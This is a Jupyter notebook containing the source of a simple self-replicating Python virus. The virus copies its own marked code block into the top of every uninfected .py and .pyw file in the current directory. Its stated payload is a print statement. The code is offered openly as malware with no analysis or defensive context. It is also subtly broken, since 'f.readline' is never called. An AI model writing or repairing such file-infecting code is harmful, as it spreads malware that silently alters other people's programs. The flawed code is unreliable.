{
 "metadata": {
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.9-final"
  },
  "orig_nbformat": 2,
  "kernelspec": {
   "name": "Python 3.7.9 64-bit",
   "display_name": "Python 3.7.9 64-bit",
   "metadata": {
    "interpreter": {
     "hash": "684b1123683431d89d3bfe9a89cc763215f4b8cd94b4aba1fb40ad45ff7c8b41"
    }
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2,
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "### THE VIRUS STARTS HERE ###\n",
    "\n",
    "import sys, glob\n",
    "\n",
    "code = []\n",
    "# open this file,read every lines and find the virus area\n",
    "with open(sys.argv[0], 'r') as f:\n",
    "    lines = f.readline\n",
    "\n",
    "virus_area = False\n",
    "for line in lines:\n",
    "    if line == '### THE VIRUS STARTS HERE ###\\n':\n",
    "      virus_area = True\n",
    "    if virus_area:\n",
    "        code.append(line)\n",
    "    if line == '### THE VIRUS ENDS HERE ###\\n':\n",
    "        break\n",
    "\n",
    "# open every files and write the replicate code\n",
    "python_scripts = glob.glob('*.py') + glob.glob('*.pyw')\n",
    "\n",
    "for script in python_scripts:\n",
    "    with open(script, 'r') as f:\n",
    "        script_code = f.readlines()\n",
    "\n",
    "    infected = False\n",
    "    for line in script_code:\n",
    "        if line == '### THE VIRUS STARTS HERE ###\\n':\n",
    "            infected = True\n",
    "            break\n",
    "    \n",
    "    if not infected:\n",
    "        final_code = []\n",
    "        final_code.extend(code)\n",
    "        final_code.extend('\\n')\n",
    "        final_code.extend(script_code)\n",
    "\n",
    "        with open(script, 'w') as f:\n",
    "            f.writelines(final_code)\n",
    "\n",
    "# Malicious piece of code\n",
    "print ('Virus is here')\n",
    "\n",
    "### THE VIRUS ENDS HERE ###"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ]
}